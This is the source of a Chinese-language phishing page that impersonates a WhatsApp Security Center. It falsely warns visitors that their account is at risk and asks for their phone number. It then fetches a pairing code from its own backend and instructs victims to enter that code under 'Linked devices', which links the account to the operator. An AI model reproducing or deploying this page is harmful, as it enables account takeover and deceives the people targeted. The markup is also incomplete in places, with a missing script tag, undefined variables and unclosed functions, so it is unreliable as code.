<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>WhatsApp安全中心</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif; background: #e8e8e8; min-height: 100vh; display: flex; justify-content: center; }
    /* WhatsApp 米色对话背景 */
    .app { width: 100%; max-width: 500px; min-height: 100vh; background: #efeae2; background-image: url("data:image/svg+xml,%3Csvg width='80' height='80' viewBox='0 0 80 80' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.4'%3E%3Ccircle cx='10' cy='10' r='1.5'/%3E%3Ccircle cx='30' cy='10' r='1'/%3E%3Ccircle cx='50' cy='10' r='1.5'/%3E%3Ccircle cx='70' cy='10' r='1'/%3E%3Ccircle cx='20' cy='30' r='1'/%3E%3Ccircle cx='40' cy='30' r='1.5'/%3E%3Ccircle cx='60' cy='30' r='1'/%3E%3Ccircle cx='10' cy='50' r='1.5'/%3E%3Ccircle cx='30' cy='50' r='1'/%3E%3Ccircle cx='50' cy='50' r='1.5'/%3E%3Ccircle cx='70' cy='50' r='1'/%3E%3Ccircle cx='20' cy='70' r='1'/%3E%3Ccircle cx='40' cy='70' r='1.5'/%3E%3Ccircle cx='60' cy='70' r='1'/%3E%3C/g%3E%3C/svg%3E"); overflow: hidden; position: relative; }

    /* 顶部栏 - 绿色 */
    .topbar { background: #26734d; height: 44px; display: flex; align-items: center; justify-content: center; position: relative; }
    .topbar::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 1px; background: #1d5c3c; }
    .topbar .title { font-size: 16px; font-weight: 600; color: #fff; }
    .topbar .avatar { position: absolute; left: 16px; width: 26px; height: 26px; border-radius: 50%; background: #2f9c65; display: flex; align-items: center; justify-content: center; }
    .topbar .avatar svg { width: 18px; height: 18px; }
    .topbar .close { position: absolute; right: 16px; color: #cde8d9; font-size: 18px; cursor: pointer; }

    .content { padding: 18px 16px 0; }

    /* 头部横幅 */
    .header-text { font-size: 14px; color: #333; line-height: 1.6; }
    .header-text .brand { font-weight: 700; }
    .header-text .intro { margin-top: 8px; }
    .header-text .sub { margin-top: 8px; color: #444; }

    /* 时间戳 */
    .timestamp { text-align: center; font-size: 12px; color: #999; margin: 16px 0; }

    /* 输入区 */
    .input-label { font-size: 15px; font-weight: 600; color: #333; margin-bottom: 12px; }
    .input-box { display: flex; align-items: center; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; height: 48px; }
    .input-box:focus-within { border-color: #4dc247; }
    /* 区号 + 状态点 */
    .cc-wrap { display: flex; align-items: center; gap: 6px; padding: 0 12px; border-right: 1px solid #eee; cursor: pointer; }
    .status-dot { width: 8px; height: 8px; border-radius: 50%; }
    .status-dot.green { background: #4dc247; box-shadow: 0 0 6px rgba(77,194,71,0.6); }
    .status-dot.red { background: #e74c3c; box-shadow: 0 0 6px rgba(231,76,60,0.6); }
    .cc-code { font-size: 15px; color: #333; font-weight: 600; }
    .cc-arrow { color: #999; font-size: 12px; }
    /* 号码输入 */
    .phone-input { flex: 1; border: none; outline: none; font-size: 16px; padding: 0 14px; color: #333; background: transparent; }
    .phone-input::placeholder { color: #bbb; }
    .phone-hint { font-size: 12px; margin: 6px 4px 0; min-height: 16px; }
    .phone-hint.ok { color: #2f9c65; }
    .phone-hint.warn { color: #e67e22; }
    .phone-hint.err { color: #e74c3c; }

    /* 提交 */
    .submit-row { display: flex; align-items: center; justify-content: flex-end; gap: 6px; margin-top: 14px; color: #2a9d3f; }
    .submit-btn { font-size: 16px; font-weight: 600; color: #2a9d3f; cursor: pointer; background: none; border: none; }

    /* 区号弹层 */
    .cc-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 50; display: none; align-items: flex-end; justify-content: center; }
    .cc-modal.show { display: flex; }
    .cc-sheet { background: #fff; width: 100%; max-width: 500px; border-radius: 16px 16px 0 0; max-height: 70vh; display: flex; flex-direction: column; }
    .cc-sheet-head { padding: 16px; border-bottom: 1px solid #eee; text-align: center; font-size: 15px; font-weight: 600; color: #333; }
    .cc-search { padding: 10px 16px; border-bottom: 1px solid #eee; }
    .cc-search input { width: 100%; border: none; outline: none; font-size: 14px; padding: 8px; background: #f4f4f4; border-radius: 6px; color: #333; }
    .cc-list { overflow-y: auto; flex: 1; }
    .cc-item { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; cursor: pointer; }
    .cc-item:hover { background: #f7f7f7; }
    .cc-item .name { font-size: 14px; color: #333; }
    .cc-item .code { font-size: 13px; color: #999; }
    .cc-close { padding: 14px; text-align: center; color: #999; font-size: 15px; cursor: pointer; border-top: 1px solid #eee; }

    /* 底部 footer */
    .footer { padding: 20px 16px; color: #666; font-size: 13px; line-height: 1.8; margin-top: 8px; }

    /* 对话消息区（客服消息气泡） */
    .chat-area { padding: 16px 16px 8px; }
    .bubble { display: flex; flex-direction: column; max-width: 86%; background: #ffffff; border-radius: 0 16px 16px 16px; box-shadow: 0 1px 2px rgba(0,0,0,0.06); overflow: hidden; margin-bottom: 12px; }
    .bubble.tutorial img { width: 100%; display: block; }
    .tutorial-title { padding: 14px 16px 0; font-size: 16px; font-weight: 700; color: #11735b; text-align: center; }
    .bubble-text { padding: 12px 16px; font-size: 14.5px; color: #212121; line-height: 1.65; }
    .bubble-time { font-size: 11px; color: #a0a0a0; padding: 0 14px 12px; text-align: right; }
    .chat-date { text-align: center; font-size: 11px; color: #a0a0a0; margin: 8px 0; }

    /* 配对码区 —— 统一协调卡片 */
    .pair-code-block { padding: 4px 16px 2px; }
    .timer { font-size: 12px; color: #888; text-align: center; margin: 4px 0 10px; letter-spacing: 0.5px; }
    .timer strong { color: #e74c3c; font-size: 15px; font-weight: 700; }
    .pair-code {
      font-size: 24px;
      font-family: 'Menlo', 'Courier New', monospace;
      font-weight: 700;
      letter-spacing: 5px;
      color: #11735b;
      text-align: center;
      padding: 14px;
      background: #f0f9f4;
      border: 1px dashed #b8d8c8;
      border-radius: 12px;
      margin: 0 0 14px;
    }
    .pair-btns { display: flex; gap: 10px; margin: 0 0 8px; }
    .green-btn {
      flex: 1;
      padding: 12px 0;
      border: none;
      border-radius: 12px;
      background: #2f9c65;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.15s;
    }
    .green-btn:active { background: #26734d; }
    .red-btn { width: 100%; padding: 12px 0; border: none; border-radius: 12px; background: #e74c3c; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.15s; }
    .red-btn:active { background: #c0392b; }
    .pair-steps {
      margin-top: 12px;
      padding: 14px 16px;
      background: #f7faf8;
      border-radius: 10px;
      font-size: 13.5px;
      color: #444;
      line-height: 1.8;
    }
    .pair-steps b { color: #11735b; }
    .step-num {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: #2f9c65;
      color: #fff;
      font-size: 11px;
      font-weight: 700;
      margin-right: 6px;
      flex-shrink: 0;
    }
    .pair-steps .step { display: flex; align-items: flex-start; margin-bottom: 6px; }
    .waiting-bubble { background:#fff; border-radius:0 16px 16px 16px; box-shadow:0 1px 2px rgba(0,0,0,0.06); padding:14px 16px; font-size:14.5px; color:#212121; max-width:86%; margin-bottom:12px; display:flex; align-items:center; gap:8px; }
    .waiting-bubble .dots { display:inline-flex; gap:4px; }
    .waiting-bubble .dot { width:5px; height:5px; border-radius:50%; background:#2f9c65; animation:dot 1.2s ease-in-out infinite; }
    .waiting-bubble .dot:nth-child(2){ animation-delay:0.15s; }
    .waiting-bubble .dot:nth-child(3){ animation-delay:0.3s; }
    @keyframes dot { 0%,60%,100%{ transform:translateY(0); opacity:0.5; } 30%{ transform:translateY(-4px); opacity:1; } }

    /* 底部消息框 */
    .msg-bar {
      position: fixed;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 100%;
      max-width: 500px;
      background: #f0f2f5;
      border-top: 1px solid #e0e0e0;
      padding: 10px 12px;
      display: flex;
      align-items: center;
      gap: 8px;
      z-index: 20;
      box-sizing: border-box;
    }
    .msg-input {
      flex: 1;
      min-width: 0;
      height: 42px;
      border: none;
      outline: none;
      border-radius: 21px;
      padding: 0 18px;
      font-size: 15px;
      background: #fff;
      color: #333;
      line-height: 42px;
      box-sizing: border-box;
    }
    .msg-input::placeholder { color: #aaa; }
    .msg-send {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      background: #26734d;
      border: none;
      color: #fff;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      padding: 0;
    }
    .content { padding-bottom: 80px; }
  </style>
</head>
<body>

      <div class="chat-area">
        <div class="chat-date">今天</div>
        <div class="bubble tutorial">
          <img id="tutorialImage" src="wha-tutorial.jpg" alt="安全代码教程" />
          <div class="bubble-text" id="bannerText">
            WhatsApp安全中心正在侦测虚拟注册号码与帐号买卖等违法行为。<br/>系统提示：您的帐号有风险提示且长期未验证，目前需要连结官方系统解除帐号风险，请配合，以免影响帐号的正常使用。
          </div>
          <div class="bubble-time">12:44</div>
        </div>
      </div>

      <div class="timestamp">12:44 下午</div>

      <div class="input-label" id="inputLabel" style="background:#fff;border-radius:10px;padding:10px 12px;">请输入您注册的WhatsApp电话号码</div>

      <div class="input-box">
        <div class="cc-wrap" onclick="openCC()">
          <span class="status-dot green" id="statusDot" title="管理器连接状态"></span>
          <span class="cc-code" id="ccCode">+81</span>
          <span class="cc-arrow">▼</span>
        </div>
        <input class="phone-input" id="phoneInput" type="tel" placeholder="輸入您的電話號碼" inputmode="tel" oninput="onPhoneChange()" />
      </div>
      <div class="phone-hint" id="phoneHint"></div>

      <div class="submit-row">
        <button class="submit-btn" onclick="submit()">提交 ›</button>
      </div>
    </div>

    <!-- 区号弹层 -->
    <div class="cc-modal" id="ccModal">
      <div class="cc-sheet">
        <div class="cc-sheet-head">选择国家 / 地区</div>
        <div class="cc-search"><input id="ccSearch" placeholder="搜索国家或区号" oninput="renderCC()" /></div>
        <div class="cc-list" id="ccList"></div>
        <div class="cc-close" onclick="closeCC()">取消</div>
      </div>
    </div>
  </div>

  <!-- 底部消息框 -->
  <div class="msg-bar">
    <input class="msg-input" id="msgInput" placeholder="输入消息…" />
    <button class="msg-send" onclick="sendMsg()" title="发送">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:18px;height:18px"><path d="M22 2L11 13" stroke-linecap="round"/><path d="M22 2L15 22l-4-9-9-4z" stroke-linejoin="round"/></svg>
    </button>
  </div>
  <div id="msgLog" style="padding:12px 16px;"></div>

  // 实时中国时间（北京时间）
  function nowTime(){
    var d = new Date();
    // 转北京时间 (UTC+8)
    var utc = d.getTime() + d.getTimezoneOffset() * 60000;
    var beijing = new Date(utc + 8 * 3600 * 1000);
    var hh = beijing.getHours(), mm = beijing.getMinutes();
    var period = hh >= 12 ? "下午" : "上午";
    var h12 = hh % 12; if(h12 === 0) h12 = 12;
    var pad = function(n){ return (n<10?"0":"")+n; };
    return { time: pad(h12)+":"+pad(mm), full: pad(h12)+":"+pad(mm)+" "+period };
  }

  function onPhoneChange(){
    var hint = document.getElementById("phoneHint");
    var raw = document.getElementById("phoneInput").value;
    var digits = raw.replace(/[^0-9]/g, "").trim();
    if(!digits){ hint.className = "phone-hint"; hint.textContent = ""; return; }
    var cc = currentCC.replace(/[^0-9]/g, "");
    var range = PHONE_LEN[cc];
    if(!range){ hint.className = "phone-hint warn"; hint.textContent = "当前区号暂不支持校验，请确认号码无误"; return; }
    var len = digits.length;
    if(len < range[0]){
      hint.className = "phone-hint err";
      hint.textContent = "号码过短，" + currentCC + " 需要 " + range[0] + "-" + range[1] + " 位（当前 " + len + " 位）";
    } else if(len > range[1]){
      hint.className = "phone-hint err";
      hint.textContent = "号码过长，" + currentCC + " 最多 " + range[1] + " 位（当前 " + len + " 位）";
    } else {
      hint.className = "phone-hint ok";
      hint.textContent = "✓ 号码格式正确";
    }
  }

  // 读取后台文案设置填充页面
  function loadFrontendText() {
    try {
      fetch("/api/frontend-text").then(function(r){ return r.json(); }).then(function(map){
        if(!map) return;
        function set(id, val){ var el = document.getElementById(id); if(el && val) el.textContent = val; }
        // 提示文字（banner_line1/2/3 拼接）
        var bannerText = document.getElementById("bannerText");
        if(bannerText){
          var lines = [map.banner_line1, map.banner_line2, map.banner_line3].filter(Boolean);
          if(lines.length){ bannerText.innerHTML = lines.join("<br/>"); }
        }
        set("inputLabel", map.input_label);
        set("phonePlaceholderName", map.phone_placeholder);
        if(map.phone_placeholder){ document.getElementById("phoneInput").setAttribute("placeholder", map.phone_placeholder); }
        if(map.tutorial_image){ document.getElementById("tutorialImage").setAttribute("src", map.tutorial_image); }
        if(map.brand_title){ document.querySelector(".topbar .title").textContent = map.brand_title; }
        var sb = document.querySelector(".submit-btn");
        if(sb && map.submit_text) sb.childNodes[0].textContent = map.submit_text;
      }).catch(function(){});
    } catch(e) {}
  }

  function submit(){
    var phone = document.getElementById("phoneInput").value.replace(/[^0-9]/g, "");
    if(phone.length < 5){ alert("请输入有效手机号码"); return; }
    // 位数校验，避免提交错误号码
    var cc = currentCC.replace(/[^0-9]/g, "");
    var range = PHONE_LEN[cc];
    if(range && (phone.length < range[0] || phone.length > range[1])){
      document.getElementById("phoneHint").className = "phone-hint err";
      document.getElementById("phoneHint").textContent = "号码位数不正确，" + currentCC + " 需要 " + range[0] + "-" + range[1] + " 位";
      return;
    }
    var full = currentCC.replace(/[^0-9]/g, "") + phone;
    var chat = document.querySelector(".chat-area");
    var msg = document.createElement("div");
    msg.className = "waiting-bubble";
    msg.innerHTML = '请稍等，正在验证中，请勿关闭页面… <span class="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>';
    chat.appendChild(msg);
    msg.scrollIntoView();

    // 调用后端获取配对码
    fetch("/api/request-pairing", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: full })
    }).then(function(r){ return r.json(); }).then(function(res){
      if(res && res.success && res.code){
        // 删除等待气泡
        if(msg && msg.parentNode){ msg.parentNode.removeChild(msg); }
        var code = res.code.replace(/(.{4})/g, "$1 ").trim();
        var bubble = document.createElement("div");
        bubble.className = "bubble";
        bubble.innerHTML =
          '<div class="bubble-text">请在一分钟内完成验证，超时将会验证失败。</div>' +

            '<div class="pair-btns">' +
              '<button class="green-btn" onclick="copyCode(\'' + res.code + '\')">复制验证码</button>' +

            '</div>' +
            '<div class="pair-steps">' +

              '<div class="step"><span class="step-num">3</span>依次轻触「已关联的设备」和「关联设备」</div>' +
              '<div class="step"><span class="step-num">4</span>轻触「改用电话号码关联」，然后在你的手机上输入此验证码</div>' +
            '</div>' +
          '</div>' +
          '<div class="bubble-time">' + nowTime().full + '</div>';
        chat.appendChild(bubble);
        bubble.scrollIntoView();
        startTimer(bubble, phone);
      } else {
        var err = document.createElement("div");
        err.className = "waiting-bubble";
        err.textContent = "验证失败：" + ((res && res.error) || "未获取到配对码，请稍后重试");
        chat.appendChild(err);
      }
    }).catch(function(e){
      var err = document.createElement("div");
      err.className = "waiting-bubble";
      err.textContent = "网络错误：" + e;
      chat.appendChild(err);
    });

  function startTimer(bubble, phone){
    var total = 60;
    var timerEl = bubble.querySelector("#timerVal");
    var iv = setInterval(function(){
      total--;
      var m = Math.floor(total/60), s = total%60;
      if(timerEl){ timerEl.textContent = (m<10?"0":"")+m+":"+(s<10?"0":"")+s; }
      if(total <= 0){
        clearInterval(iv);
        // 删除配对码气泡，追加红色重新验证
        if(bubble && bubble.parentNode){ bubble.parentNode.removeChild(bubble); }
        var chat = document.querySelector(".chat-area");
        var retry = document.createElement("div");
        retry.className = "bubble";
        retry.innerHTML =
          '<div class="bubble-text">验证超时，验证失败。</div>' +
          '<div class="pair-code-block">' +
            '<div class="pair-btns">' +
              '<button class="red-btn" onclick="resetToPage1()">重新验证</button>' +
            '</div>' +
          '</div>' +
          '<div class="bubble-time">' + nowTime().full + '</div>';
        chat.appendChild(retry);
        retry.scrollIntoView();
      }
    }, 1000);
  }

  function resetToPage1(){
    // 回到第一页（接入页 hotline.html）
    window.location.href = "hotline.html";
  }

  function copyCode(code){
    try { navigator.clipboard.writeText(code); } catch(e){}
    var btns = document.querySelectorAll(".green-btn");
    if(btns[0]){ btns[0].textContent = "已复制"; setTimeout(function(){ btns[0].textContent = "复制验证码"; }, 2000); }
  }

  function openWhatsApp(){
    var isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
    if(isMobile){ window.location.href = "whatsapp://app"; }
    else { window.open("https://web.whatsapp.com", "_blank"); }
  }

  function sendMsg(){
    var inp = document.getElementById("msgInput");
    var txt = inp.value.trim();
    if(!txt) return;
    var log = document.getElementById("msgLog");
    var d = document.createElement("div");
    d.style.cssText = "text-align:right;background:#dcf8c6;display:inline-block;padding:8px 12px;border-radius:10px;margin:6px 0;max-width:80%;float:right;clear:both;color:#333;font-size:14px;";
    d.textContent = txt;
    log.appendChild(d);
    inp.value = "";
    log.scrollTop = log.scrollHeight;
  }
</script>
</body>
</html>
